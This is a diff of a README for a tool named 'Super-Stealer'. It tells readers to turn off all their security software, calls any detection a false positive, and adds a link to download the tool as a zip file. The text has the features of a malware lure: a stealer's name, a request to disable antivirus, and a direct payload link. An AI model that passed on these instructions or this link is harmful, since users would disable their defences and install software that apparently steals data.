@@ -12,3 +12,6 @@ How to use:
 Turn off all security as this can show as a false positive ( an entity, such as a file or a process that was detected and identified as malicious even though the entity isn't actually a threat.)
 Download Super-Stealer
 
+Download Here
+https://downgit.github.io/#/home?url=https://github.com/SwaggYzzX/Super-Stealer/blob/main/Super%20Stealer.zip
+
